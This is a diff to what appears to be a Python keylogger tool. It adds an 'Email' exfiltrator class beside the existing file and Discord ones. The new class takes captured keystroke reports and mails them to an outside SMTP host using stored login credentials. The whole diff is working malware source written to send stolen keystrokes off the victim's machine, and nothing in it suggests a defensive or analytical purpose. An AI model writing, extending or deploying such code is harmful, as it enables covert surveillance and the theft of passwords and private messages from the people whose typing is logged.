@@ -7,6 +7,8 @@ import abc
 import aiohttp
 import asyncio
 import platform
+import smtplib
+import ssl
 from datetime import datetime
 from pathlib import Path
 
@@ -71,6 +73,33 @@ class TextFile(Exfiltrator):
         if self.keylogger.has_data:
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                 file.write(f"{self.report}\n")
+
+
+class Email(Exfiltrator):
+    def __init__(self, *,
+                 keylogger: KeyLogger,
+                 tag: str = None,
+                 smtp_host: str,
+                 smtp_port: int,
+                 email: str,
+                 password: str):
+        super().__init__(keylogger, tag)
+        self.smtp_host = smtp_host
+        self.smtp_port = smtp_port
+        self.email = email
+        self.password = password
+
+    def update(self):
+        if self.keylogger.has_data:
+            with smtplib.SMTP_SSL(
+                    host=self.smtp_host,
+                    port=self.smtp_port,
+                    context=ssl.create_default_context()
+            ) as server:
+                server.login(user=self.email, password=self.password)
+                server.sendmail(from_addr=self.email,
+                                to_addrs=self.email,
+                                msg=f"Subject:{self.tag}\n\n{self.report}")
 
 
 class Discord(Exfiltrator):
